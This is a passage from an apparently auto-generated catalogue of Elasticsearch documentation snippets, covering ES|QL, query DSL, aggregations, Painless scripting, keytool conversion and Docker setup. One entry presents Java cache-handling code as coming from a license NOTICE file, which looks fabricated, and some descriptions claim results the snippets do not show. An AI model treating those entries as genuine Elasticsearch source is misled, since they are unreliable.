Painless\nCODE:\n```\n\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalEqlScriptUtils.seq(InternalEqlScriptUtils.between(X0,params.v1,params.v2,params.v3,params.v4),params.v5)))\" \"params\":{\"v0\":\"process_name\",\"v1\":\"s\",\"v2\":\"e\",\"v3\":false,\"v4\":false,\"v5\":\"yst\"}\n```\n\n----------------------------------------\n\nTITLE: Converting PKCS#12 to Java KeyStore (JKS)\nDESCRIPTION: Function to convert a PKCS#12 certificate to Java KeyStore format using the keytool utility. Takes source and destination file paths and passwords.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nfunction p12-to-jks() {\n    local P12File=\"$1\"\n    local P12Pass=\"$2\"\n    local JksFile=\"$3\"\n    local JksPass=\"$4\"\n    \n    keytool -importkeystore -srckeystore \"${PWD}/$P12File\" -srcstorepass \"$P12Pass\" \\\n        -destkeystore \"${PWD}/$JksFile\"  -deststoretype JKS -deststorepass \"$JksPass\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Maximum Value with MAX Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MAX function in ESQL to find the maximum value of the 'languages' field from the 'employees' index. The STATS command is used in conjunction with MAX to perform the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/max.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS MAX(languages)\n```\n\n----------------------------------------\n\nTITLE: Type Table Mapping File Example\nDESCRIPTION: This demonstrates how to customize type mappings using a file. The file contains character mappings to specific types, allowing for fine-grained control over token splitting.  The example shows how to map characters like $, %, '.', and ',' to the DIGIT type, and the Zero-Width Joiner to ALPHANUM.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: txt\nCODE:\n```\n# Map the $, %, '.', and ',' characters to DIGIT\n# This might be useful for financial data.\n$ => DIGIT\n% => DIGIT\n. => DIGIT\n\\\\u002C => DIGIT\n\n# in some cases you might not want to split on ZWJ\n# this also tests the case where we need a bigger byte[]\n# see https://en.wikipedia.org/wiki/Zero-width_joiner\n\\\\u200D => ALPHANUM\n```\n\n----------------------------------------\n\nTITLE: Defining Elasticsearch Settings in YAML\nDESCRIPTION: YAML frontmatter defining mapped pages and navigation title for the Elasticsearch documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/pressure.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/reference/current/index-modules-indexing-pressure.html\nnavigation_title: Indexing pressure\n```\n\n----------------------------------------\n\nTITLE: Unsupported Date Math Expressions (ES|QL)\nDESCRIPTION: This code snippet showcases unsupported date math expressions in ES|QL.  These examples, involving parentheses around the time units or placing the datetime function `now()` on the right side of the expression, are currently not supported. Attempting to use them will result in an error.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_7\n\nLANGUAGE: txt\nCODE:\n```\n\"1year + 2hour + now()\\nnow() + (1year + 2hour)\"\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL String Manipulation Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for an ESQL function that operates on strings. It specifies three parameters: a string expression, a start position, and an optional length for substring extraction.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/substring.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   String expression. If `null`, the function returns `null`.\n\n`start`\n:   Start position.\n\n`length`\n:   Length of the substring from the start position. Optional; if omitted, all positions after `start` are returned.\n```\n\n----------------------------------------\n\nTITLE: Example Connector Config YAML\nDESCRIPTION: This YAML configuration snippet shows the basic settings required for connecting to Elasticsearch and configuring a connector.  It highlights the need to specify the Elasticsearch host, API key, connector ID, service type, and connector API key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-docker.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: sharepoint_online # Example value — update this for service type you are connecting to\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Configuring Deprecated Java APIs List\nDESCRIPTION: Configuration block specifying metadata and default message for deprecated APIs. Sets up ignore missing classes flag and defines default deprecation message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n@ignoreMissingClasses\n@defaultMessage Deprecated in Java 17\n```\n\n----------------------------------------\n\nTITLE: Converting Numeric to String using TO_STRING in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_STRING function in ESQL to convert a numeric value into a string. It creates a row with a numeric value and then uses TO_STRING to convert it to a string in a new column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_string.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=10\n| EVAL j = TO_STRING(a)\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Users Command Synopsis\nDESCRIPTION: Shows the complete syntax for the elasticsearch-users command including all available operations like useradd, list, passwd, roles, and userdel.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users\n([useradd <username>] [-p <password>] [-r <roles>]) |\n([list] <username>) |\n([passwd <username>] [-p <password>]) |\n([roles <username>] [-a <roles>] [-r <roles>]) |\n([userdel <username>])\n```\n\n----------------------------------------\n\nTITLE: Indexing a LineString Shape in GeoJSON Format\nDESCRIPTION: This example shows how to index a linestring shape in GeoJSON format. The linestring is defined with a type and coordinates array containing two or more points that form a line.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"linestring\",\n    \"coordinates\" : [[-377.03653, 389.897676], [-377.009051, 389.889939]]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monitoring Request Cache Usage by Index in Elasticsearch\nDESCRIPTION: This command retrieves request cache statistics for all indices using the indices stats API. The 'human' parameter formats the size values to be human-readable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_stats/request_cache?human\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Response for Frequent Items Aggregation with Runtime Field\nDESCRIPTION: This is the response to the previous query, showing the most frequent combinations of categories, price ranges, and cities. It demonstrates how the runtime field 'price_range' is used in the aggregation results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n(...)\n\"aggregations\" : {\n    \"my_agg\" : {\n      \"buckets\" : [\n        {\n          \"key\" : {\n            \"category.keyword\" : [\n              \"Women's Clothing\",\n              \"Women's Shoes\"\n            ],\n            \"price_range\" : [\n              \"50-100\"\n            ],\n            \"geoip.city_name\" : [\n              \"New York\"\n            ]\n          },\n          \"doc_count\" : 100,\n          \"support\" : 0.0213903743315508\n        },\n        {\n          \"key\" : {\n            \"category.keyword\" : [\n              \"Women's Clothing\",\n              \"Women's Shoes\"\n            ],\n            \"price_range\" : [\n              \"50-100\"\n            ],\n            \"geoip.city_name\" : [\n              \"Dubai\"\n            ]\n          },\n          \"doc_count\" : 59,\n          \"support\" : 0.012620320855614974\n        },\n        {\n          \"key\" : {\n            \"category.keyword\" : [\n              \"Men's Clothing\",\n              \"Men's Shoes\"\n            ],\n            \"price_range\" : [\n              \"50-100\"\n            ],\n            \"geoip.city_name\" : [\n              \"Marrakesh\"\n            ]\n          },\n          \"doc_count\" : 53,\n          \"support\" : 0.011336898395721925\n        }\n      ],\n    (...)\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Using Moving Percentiles in a Date Histogram Aggregation\nDESCRIPTION: Demonstrates how to embed a moving_percentiles aggregation within a date_histogram, including a percentile metric as its input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-moving-percentiles-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n        \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_percentile\": {\n            \"percentiles\": {\n            \"field\": \"price\",\n            \"percents\": [ 1.0, 99.0 ]\n          }\n        },\n        \"the_movperc\": {\n          \"moving_percentiles\": {\n            \"buckets_path\": \"the_percentile\",\n            \"window\": 10\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Role Mapping Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Defines the structure of a role mapping object in security configuration change events. It includes fields for the mapping name, roles, role templates, rules, enabled status, and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_22\n\nLANGUAGE: javascript\nCODE:\n```\n{\"name\": <string>, \"roles\": <string_list>, \"role_templates\": [{\"template\": <string>,\n\"format\": <string>}], \"rules\": <object>, \"enabled\": <boolean>, \"metadata\": <object>}\n```\n\n----------------------------------------\n\nTITLE: best_fields Query Execution\nDESCRIPTION: This snippet shows how the `best_fields` type is executed internally as a dis_max query. It finds the single best matching field and combines scores using the tie_breaker.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"dis_max\": {\n      \"queries\": [\n        { \"match\": { \"subject\": \"brown fox\" }},\n        { \"match\": { \"message\": \"brown fox\" }}\n      ],\n      \"tie_breaker\": 0.3\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Hashing Methods to String Class in Elasticsearch Painless\nDESCRIPTION: This snippet adds SHA-1, SHA-256, and SHA-512 hashing methods to the String class in the Elasticsearch Painless scripting language. These methods allow for easy generation of hash values from string data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/src/main/resources/org/elasticsearch/xpack/watcher/painless_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.String {\n  String org.elasticsearch.painless.api.Augmentation sha1()\n  String org.elasticsearch.painless.api.Augmentation sha256()\n  String org.elasticsearch.painless.api.Augmentation sha512()\n}\n```\n\n----------------------------------------\n\nTITLE: MEDIAN_ABSOLUTE_DEVIATION Warning Message in Markdown\nDESCRIPTION: A warning block written in Markdown syntax that alerts users about the non-deterministic nature of the MEDIAN_ABSOLUTE_DEVIATION function, indicating that results may vary for the same input data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/appendix/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n::::{warning}\n`MEDIAN_ABSOLUTE_DEVIATION` is also [non-deterministic](https://en.wikipedia.org/wiki/Nondeterministic_algorithm).\nThis means you can get slightly different results using the same data.\n::::\n```\n\n----------------------------------------\n\nTITLE: Using Top-Level Query for Efficient Aggregation in Elasticsearch\nDESCRIPTION: This example shows how to use a top-level query to limit all aggregations in a search, which is faster than using a single filter aggregation with sub-aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filter-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"query\": { \"term\": { \"type\": \"t-shirt\" } },\n  \"aggs\": {\n    \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up an index with synthetic source for scaled_float field type\nDESCRIPTION: Creates an index with synthetic source enabled and a scaled_float field with scaling_factor of 0.01, demonstrating how scaling factor is applied to values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/number.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"f\": { \"type\": \"scaled_float\", \"scaling_factor\": 0.01 }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"f\": 123\n}\n```\n\n----------------------------------------\n\nTITLE: Using Painless to Determine Day of the Week\nDESCRIPTION: The snippet demonstrates how to calculate and return the day of the week, given a datetime field in Elasticsearch using Painless scripting. This requires proper mapping of the datetime field to allow for direct access and operation on its values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs-mdx/painless/painless-field-context.mdx#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\ndoc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ROOT)\n```\n\n----------------------------------------\n\nTITLE: Filtering for NOT NULL Values and Aggregating in ESQL\nDESCRIPTION: This query selects employees where the is_rehired field is NOT NULL and then counts the total number of employee numbers. The result shows a count of 84 employees who have been rehired.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/predicates.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE is_rehired IS NOT NULL\n| STATS COUNT(emp_no)\n```\n\n----------------------------------------\n\nTITLE: Documenting Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for a geospatial or cartesian function in Elasticsearch's ESQL. It specifies that the 'point' parameter can accept various geometric types and handles null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_xmin.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`point`\n:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Executing EQL Sample Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform an EQL sample query on the previously created indices. The query searches for events matching specific criteria using the 'by' keyword and multiple filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index*/_eql/search\n{\n  \"query\": \"\"\"\n    sample by host\n      [any where uptime > 0]\n      [any where port > 100]\n      [any where bool == true]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting CATEGORIZE Function Limitations in Markdown\nDESCRIPTION: Lists the limitations of the CATEGORIZE function in ESQL. It specifies that the function cannot be used within other expressions, can only be used once in groupings, cannot be used or referenced within aggregate functions, and must be the first grouping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/categorize.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n* can't be used within other expressions\n* can't be used more than once in the groupings\n* can't be used or referenced within aggregate functions and it has to be the first grouping\n```\n\n----------------------------------------\n\nTITLE: Metadata Class for Script Details\nDESCRIPTION: This snippet defines a class for retrieving metadata related to scripts in Elasticsearch, including methods for obtaining the index, ID, routing, version, operation type, and current time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_2\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.Metadata {\n    String getIndex()\n    String getId()\n    String getRouting()\n    long getVersion()\n    String getOp()\n    void setOp(String)\n    ZonedDateTime getNow()\n}\n```\n\n----------------------------------------\n\nTITLE: Script-Based String Conversion in Elasticsearch\nDESCRIPTION: Applies a custom script to convert the `pid` field to a string and matches it against '123'. Targets `process` events for script execution within Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_10\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\n\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalEqlScriptUtils.seq(InternalEqlScriptUtils.string(X0),params.v1)))\" \"params\":{\"v0\":\"pid\",\"v1\":\"123\"}\n```\n\n----------------------------------------\n\nTITLE: Netty Channel Future Listener Method Specification\nDESCRIPTION: Annotation defining the preferred method for adding listeners to Netty channel futures in Elasticsearch. Directs developers to use the Netty4Utils wrapper instead of direct ChannelFuture listener addition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/transport-netty4/forbidden/netty-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage Use org.elasticsearch.transport.netty4.Netty4Utils.addListener(io.netty.channel.ChannelFuture, io.netty.channel.ChannelFutureListener) instead\nio.netty.channel.ChannelFuture#addListener(io.netty.util.concurrent.GenericFutureListener)\n```\n\n----------------------------------------\n\nTITLE: Finding Maximum Value in Multivalued Column using MV_MAX in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_MAX function in ESQL to convert a multivalued expression into a single value containing the maximum value. It creates a row with a multivalued column 'a' and then applies MV_MAX to find the maximum value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_max.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1]\n| EVAL max_a = MV_MAX(a)\n```\n\n----------------------------------------\n\nTITLE: Reindexing Percolator Queries\nDESCRIPTION: Shows the process of reindexing percolator queries to a new index and updating aliases.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT new_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"query\" : {\n        \"type\" : \"percolator\"\n      },\n      \"body\" : {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n\nPOST /_reindex?refresh\n{\n  \"source\": {\n    \"index\": \"index\"\n  },\n  \"dest\": {\n    \"index\": \"new_index\"\n  }\n}\n\nPOST _aliases\n{\n  \"actions\": [\n    {\n      \"remove\": {\n        \"index\" : \"index\",\n        \"alias\": \"queries\"\n      }\n    },\n    {\n      \"add\": {\n        \"index\": \"new_index\",\n        \"alias\": \"queries\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Rank Evaluation API with Recall Metric\nDESCRIPTION: This snippet demonstrates how to use the Elasticsearch Rank Evaluation API with the Recall at K metric. It sets the k value to 20 and the relevant rating threshold to 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"JFK query\",\n      \"request\": { \"query\": { \"match_all\": {} } },\n      \"ratings\": []\n    } ],\n  \"metric\": {\n    \"recall\": {\n      \"k\": 20,\n      \"relevant_rating_threshold\": 1\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Substring from Right in ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of the RIGHT function to extract the last 3 characters from the 'last_name' field of employees. It keeps only the 'last_name' column and creates a new 'right' column with the extracted substring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/right.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL right = RIGHT(last_name, 3)\n```\n\n----------------------------------------\n\nTITLE: Using AND Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the AND logical operator to filter data where both conditions must be true. This example selects the last_name field from the test_emp index where emp_no is greater than 10000 AND less than 10005.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-logical.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no > 10000 AND emp_no < 10005 ORDER BY emp_no LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Performing Time Series Aggregation in Elasticsearch\nDESCRIPTION: This snippet shows how to perform a basic time series aggregation using the 'time_series' aggregation type. The 'keyed' parameter is set to false, meaning the results will be returned as an array rather than a keyed map.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-time-series-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"ts\": {\n      \"time_series\": { \"keyed\": false }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keep Words Filter in Elasticsearch\nDESCRIPTION: This example uses the analyze API to demonstrate the Keep Words filter, which keeps only the 'fox' and 'dog' tokens from the input text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-words-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"keep\",\n      \"keep_words\": [ \"dog\", \"elephant\", \"fox\" ]\n    }\n  ],\n  \"text\": \"the quick fox jumps over the lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Deprecated Java XML and Security API References\nDESCRIPTION: List of deprecated fully qualified class names from Java's SAX XML parsing and GSS security packages that need to be updated to newer APIs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-deprecated.txt#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\norg.ietf.jgss.GSSContext#wrap(java.io.InputStream,java.io.OutputStream,org.ietf.jgss.MessageProp)\norg.xml.sax.AttributeList\norg.xml.sax.DocumentHandler\norg.xml.sax.HandlerBase\norg.xml.sax.Parser\norg.xml.sax.helpers.AttributeListImpl\norg.xml.sax.helpers.ParserFactory\norg.xml.sax.helpers.XMLReaderFactory\n```\n\n----------------------------------------\n\nTITLE: Documentation Comment for ESQL's Lowercase Function\nDESCRIPTION: This markdown comment describes an ESQL function that converts input strings to lowercase. The function returns a new string with all characters converted to their lowercase equivalents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_lower.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns a new string representing the input string converted to lower case.\n```\n\n----------------------------------------\n\nTITLE: Simulating Registered Domain Processor in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the registered domain processor in an Elasticsearch ingest pipeline. It extracts domain components from a given FQDN and stores them in a target field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/registered-domain-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"registered_domain\": {\n          \"field\": \"fqdn\",\n          \"target_field\": \"url\"\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"fqdn\": \"www.example.ac.uk\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying with Match Operator in ESQL\nDESCRIPTION: This snippet demonstrates how to use the match operator to query documents in the 'books' index for a specific author. The syntax resembles SQL-like queries and checks if the author matches 'Faulkner'. Dependency on Elasticsearch's ESQL is necessary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/match_operator.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE author:\"Faulkner\"\n```\n\n----------------------------------------\n\nTITLE: Grouping by Multiple Multivalued Keys in ESQL\nDESCRIPTION: Illustrates how grouping by multiple multivalued keys places the input row in all relevant groups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_8\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS count(*)\nBY languages, skills;\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides a template for the boilerplate notice to be included when applying the Apache License 2.0 to a software project. It includes placeholders for the copyright year and owner, as well as the full text of the license notice.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/guava-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch in Docker for Development\nDESCRIPTION: Docker command to start a local Elasticsearch instance for testing purposes. This setup disables security features and is not suitable for production use.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ndocker run -p 9200:9200 -d --name elasticsearch \\\n  -e \"discovery.type=single-node\" \\\n  -e \"xpack.security.enabled=false\" \\\n  -e \"xpack.security.http.ssl.enabled=false\" \\\n  -e \"xpack.license.self_generated.type=trial\" \\\n  docker.elastic.co/elasticsearch/elasticsearch:9.0.0\n```\n\n----------------------------------------\n\nTITLE: Match Query Parameters Documentation\nDESCRIPTION: Defines the required and optional parameters for the match query function in ESQL. Includes the field to search, query value, and optional match parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Field that the query will target.\n\n`query`\n:   Value to find in the provided field.\n\n`options`\n:   (Optional) Match additional options as [function named parameters](/reference/query-languages/esql/esql-syntax.md#esql-function-named-params). See [match query](/reference/query-languages/query-dsl/query-dsl-match-query.md) for more information.\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Data Path via Command Line\nDESCRIPTION: Demonstrates how to set the data path using command line arguments when starting Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\n./bin/elasticsearch -Epath.data=/var/elasticsearch/data\n```\n\n----------------------------------------\n\nTITLE: Implementing Request Execution with Cache Management\nDESCRIPTION: This method executes requests with cache handling logic. It first checks and potentially clears the cache if requested, then processes the request and updates the cache with the result. The implementation ensures thread-safe cache updates in concurrent environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/gax-httpjson-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n@Override\npublic ExecutionResult<Response> execute(Request request, RequestExecution<Request, Response> execution) throws Exception {\n    // First check if a cache reset has been requested\n    if (resetRequested) {\n        // Clear the entries and reset the flag\n        entries.clear();\n        resetRequested = false;\n    }\n    \n    // Look up in the cache using the request as key\n    Response cachedResponse = entries.get(request);\n    if (cachedResponse != null) {\n        // Cache hit - return the cached response\n        return new ExecutionResult<>(cachedResponse, true);\n    }\n    \n    // Cache miss - execute the request\n    Response response = execution.execute(request);\n    \n    // Store in cache for future use\n    entries.put(request, response);\n    \n    // Return the new response with a flag indicating it wasn't from cache\n    return new ExecutionResult<>(response, false);\n}\n```\n\n----------------------------------------\n\nTITLE: Default Stoptags Configuration in Nori Token Filter\nDESCRIPTION: Default configuration showing the array of part-of-speech tags that should be removed by the nori_part_of_speech filter.\nSOURCE: 